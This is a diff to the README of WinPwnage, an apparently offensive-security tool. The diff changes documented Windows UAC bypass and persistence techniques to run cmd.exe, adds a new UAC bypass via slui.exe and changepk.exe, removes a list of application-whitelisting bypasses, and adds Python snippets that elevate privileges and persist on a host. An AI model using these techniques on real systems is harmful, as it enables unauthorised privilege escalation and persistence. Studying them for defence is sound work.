@@ -69,26 +69,26 @@ The goal of this repo is to study the Windows penetration techniques. Techniques
 	* Fixed in: n/a
 * UAC bypass using cliconfg.exe (DLL payload only)
     * Id: 11
-    * Method: DLL hijacking NTWDBLIB.dll using makecab and wusa
-    * Syntax: `winpwnage.py --use uac --id 11 --payload payload.dll`
+    * Method: DLL hijack using makecab and wusa
+    * Syntax: `winpwnage.py --use uac --id 11 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
 	* Fixed in: 9800
 * UAC bypass using mcx2prov.exe (DLL payload only)
     * Id: 12
-    * Method: DLL hijacking CRYPTBASE.dll using makecab and wusa
-    * Syntax: `winpwnage.py --use uac --id 12 --payload payload.dll`
+    * Method: DLL hijack using makecab and wusa
+    * Syntax: `winpwnage.py --use uac --id 12 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
 	* Fixed in: 10147
 * UAC bypass using migwiz.exe (DLL payload only)
     * Id: 13
-    * Method: DLL hijacking CRYPTBASE.dll using makecab and wusa
-    * Syntax: `winpwnage.py --use uac --id 13 --payload payload.dll`
+    * Method: DLL hijack using makecab and wusa
+    * Syntax: `winpwnage.py --use uac --id 13 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
-	* Fixed in: 10147
+	* Fixed in: 10147	
 * UAC bypass using sysprep.exe (DLL payload only)
     * Id: 14
-    * Method: DLL hijacking CRYPTBASE.dll using makecab and wusa
-    * Syntax: `winpwnage.py --use uac --id 14 --payload payload.dll`
+    * Method: DLL hijack using makecab and wusa
+    * Syntax: `winpwnage.py --use uac --id 14 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
 	* Fixed in: 9600
 * UAC bypass using token manipulation
@@ -112,13 +112,13 @@ The goal of this repo is to study the Windows penetration techniques. Techniques
 * UAC bypass using .NET Code Profiler (DLL payload only)
     * Id: 18
     * Method: Registry key (Class) manipulation and DLL hijack
-    * Syntax: `winpwnage.py --use uac --id 18 --payload payload.dll`
+    * Syntax: `winpwnage.py --use uac --id 18 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
 	* Fixed in: n/a
 * UAC bypass using mocking trusted directories (DLL payload only)
     * Id: 19
     * Method: Mock SystemRoot directory and DLL hijack
-    * Syntax: `winpwnage.py --use uac --id 19 --payload payload.dll`
+    * Syntax: `winpwnage.py --use uac --id 19 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 7600
 	* Fixed in: n/a
 * UAC bypass using wsreset.exe
@@ -127,12 +127,18 @@ The goal of this repo is to study the Windows penetration techniques. Techniques
     * Syntax: `winpwnage.py --use uac --id 19 --payload c:\\windows\\system32\\cmd.exe`
 	* Works from: 17134
 	* Fixed in: n/a
+* UAC bypass using slui.exe and changepk.exe
+    * Id: 21
+    * Method: Registry key (Class) manipulation
+    * Syntax: `winpwnage.py --use uac --id 21 --payload c:\\windows\\system32\\cmd.exe`
+	* Works from: 17763
+	* Fixed in: n/a
 
 ## Persistence techniques:
 * Persistence using explorer.exe (DLL payload only)
     * Id: 1
-    * Method: DLL hijacking FXSST.dll using makecab and wusa
-    * Syntax: `winpwnage.py --use persist --id 1 --payload payload.dll`
+    * Method: DLL hijack using makecab and wusa
+    * Syntax: `winpwnage.py --use persist --id 1 --payload c:\\windows\\system32\\cmd.exe`
 	* Requires: n/a
 	* Works from: 7600
 	* Fixed in: 9800
@@ -272,122 +278,27 @@ The goal of this repo is to study the Windows penetration techniques. Techniques
 	* Works from: 7600
 	* Fixed in: n/a
 
-## AWL bypass techniques:
-* Bypass Application Whitelisting using forfiles.exe
-    * Id: 1
-    * Method: Executes payload because it's a match for notepad.exe in the system directory
-    * Syntax: `winpwnage.py --use execute --id 1--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using pcalua.exe
-    * Id: 2
-    * Method: Executes payload by running pcalua.exe with parameter -a
-    * Syntax: `winpwnage.py --use execute --id 2--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using vsjitdebugger.exe
-    * Id: 3
-    * Method: Execute payload by calling it with vsjitdebugger.exe
-    * Syntax: `winpwnage.py --use execute --id 3--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a	
-* Bypass Application Whitelisting using bash.exe if Linux subsystem is installed
-    * Id: 4
-    * Method: Executes payload by running bash.exe with parameter -c
-    * Syntax: `winpwnage.py --use execute --id 4--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 1020
-	* Fixed in: n/a
-* Bypass Application Whitelisting using diskshadow.exe
-    * Id: 5
-    * Method: Executes payload by running diskshadow.exe script
-    * Syntax: `winpwnage.py --use execute --id 5--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a	
-* Bypass Application Whitelisting using Advpack.dll
-    * Id: 6
-    * Method: Execute payload by calling the RegisterOCX function in Advpack.dll
-    * Syntax: `winpwnage.py --use execute --id 6--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using dxcap.exe
-    * Id: 7
-    * Method: Executes payload by running dxcap.exe with parameter -c
-    * Syntax: `winpwnage.py --use execute --id 7--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using ieadvpack.dll
-    * Id: 8
-    * Method: Execute payload by calling the RegisterOCX function in ieadvpack.dll
-    * Syntax: `winpwnage.py --use execute --id 8--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using ieframe.dll
-    * Id: 9
-    * Method: Execute payload by calling the OpenURL function in ieframe.dll
-    * Syntax: `winpwnage.py --use execute --id 9--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using pcwutl.dll
-    * Id: 10
-    * Method: Execute payload by calling the LaunchApplication function in pcwutl.dll
-    * Syntax: `winpwnage.py --use execute --id 10--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using ftp.exe
-    * Id: 11
-    * Method:  Executes payload by running ftp.exe script
-    * Syntax: `winpwnage.py --use execute --id 11--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a	
-* Bypass Application Whitelisting using shdocvw.dll
-    * Id: 12
-    * Method: Execute payload by calling the OpenURL function in shdocvw.dll
-    * Syntax: `winpwnage.py --use execute --id 12--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using url.dll
-    * Id: 13
-    * Method: Execute payload by calling the OpenURL function in url.dll
-    * Syntax: `winpwnage.py --use execute --id 13--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using zipfldr.dll
-    * Id: 14
-    * Method: Execute payload by calling the RouteTheCall function in zipfldr.dll
-    * Syntax: `winpwnage.py --use execute --id 3--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a	
-* Bypass Application Whitelisting using sqltoolsps.exe
-    * Id: 15
-    * Method: Executes payload by running sqltoolsps.exe with parameters -noprofile -command Start-Process
-    * Syntax: `winpwnage.py --use execute --id 15--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-* Bypass Application Whitelisting using appvlp.exe
-    * Id: 16
-    * Method: Executes payload by running a batch file with appvlp.exe
-    * Syntax: `winpwnage.py --use execute --id 15--payload c:\\windows\\system32\\cmd.exe`
-	* Requires: n/a
-	* Works from: 7600
-	* Fixed in: n/a
-
 ## Installing the Dependencies:
 ```pip install -r requirements.txt```
+
+## Importing WinPwnage examples:
+Bypass UAC using uacMethod2 with params on payload
+```
+from winpwnage.functions.uac.uacMethod2 import uacMethod2
+uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
+```
+
+Persist on system using persistMethod4
+```
+from winpwnage.functions.persist.persistMethod4 import persistMethod4
+persistMethod4(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
+```
+
+Elevate from administrator to system using elevateMethod1
+```
+from winpwnage.functions.persist.elevateMethod1 import elevateMethod1
+elevateMethod1(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
+```
 
 ## Build with py2exe:
 In order for a successful build, install the py2exe (http://www.py2exe.org) module and use the provided build.py script to compile all the scripts in to a portable executable.  This only seems to work on Python 2, not on Python 3.
